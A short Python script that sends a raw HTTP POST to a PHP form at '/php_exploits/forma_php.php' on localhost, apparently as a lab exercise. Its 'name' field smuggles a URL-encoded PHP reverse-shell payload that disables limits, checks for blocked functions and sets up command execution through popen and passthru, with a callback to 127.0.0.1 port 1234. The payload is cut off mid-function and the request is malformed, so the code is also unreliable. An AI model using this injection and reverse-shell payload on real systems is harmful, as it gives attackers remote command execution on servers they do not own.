from socket import socket,error


                
host = "127.0.0.1"
port = 7070



request = """
POST /php_exploits/forma_php.php HTTP/1.1
Host: 127.0.0.1:7070
Content-Length: 1492
Content-Type: application/x-www-form-urlencoded
Connection: close
"""
request_bytes = request.encode()
body = "name=%40error_reporting%280%29%3B+++++++%40set_time_limit%280%29%3B+%40ignore_user_abort%281%29%3B+%40ini_set%28%27max_execution_time%27%2C0%29%3B+++++++%24dis%3D%40ini_get%28%27disable_functions%27%29%3B+++++++if%28%21empty%28%24dis%29%29%7B+++++++++%24dis%3Dpreg_replace%28%27%2F%5B%2C+%5D%2B%2F%27%2C+%27%2C%27%2C+%24dis%29%3B+++++++++%24dis%3Dexplode%28%27%2C%27%2C+%24dis%29%3B+++++++++%24dis%3Darray_map%28%27trim%27%2C+%24dis%29%3B+++++++%7Delse%7B+++++++++%24dis%3Darray%28%29%3B+++++++%7D++++++++++++%24ipaddr%3D%27127.0.0.1%27%3B+++++%24port%3D1234%3B++++++if%28%21function_exists%28%27SqMVUlhCqNBNyr%27%29%29%7B+++++++function+SqMVUlhCqNBNyr%28%24c%29%7B+++++++++global+%24dis%3B++++++++++++++++if+%28FALSE+%21%3D%3D+strpos%28strtolower%28PHP_OS%29%2C+%27win%27+%29%29+%7B+++++++++%24c%3D%24c.%22+2%3E%261%5Cn%22%3B+++++++%7D+++++++%24sSqaa%3D%27is_callable%27%3B+++++++%24daQYsC%3D%27in_array%27%3B++++++++++++++if%28%24sSqaa%28%27popen%27%29and%21%24daQYsC%28%27popen%27%2C%24dis%29%29%7B+++++++++%24fp%3Dpopen%28%24c%2C%27r%27%29%3B+++++++++%24o%3DNULL%3B+++++++++if%28is_resource%28%24fp%29%29%7B+++++++++++while%28%21feof%28%24fp%29%29%7B+++++++++++++%24o.%3Dfread%28%24fp%2C1024%29%3B+++++++++++%7D+++++++++%7D+++++++++%40pclose%28%24fp%29%3B+++++++%7Delse+++++++if%28%24sSqaa%28%27passthru%27%29and%21%24daQYsC%28%27passthru%27%2C%24dis%29%29%7B+++++++++ob_start%28%29%3B+++++++++passthru%28%24c%29%3B+++++++++%24o%3Dob_get_contents%28%29%3B++++++++&email=fefe&submit=Submit"
body_bytes = body.encode()
total = request_bytes + body_bytes
try:
  s = socket()
  s.connect((host,port))
  s.sendall(total)
  res = s.recv(4096)
  print(res)
  s.close()
except error:
  s.close()